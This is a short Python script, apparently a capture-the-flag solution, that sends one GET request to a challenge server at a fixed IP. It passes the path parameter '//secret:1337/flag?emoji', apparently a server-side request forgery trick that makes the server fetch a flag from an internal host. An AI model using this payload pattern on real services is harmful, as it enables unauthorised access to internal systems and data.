from requests import request as req

path = "//secret:1337/flag?emoji"

res = req(
    url="http://34.170.146.252:61178/api?path=" + path,
    method="GET",
)

print(res.text)
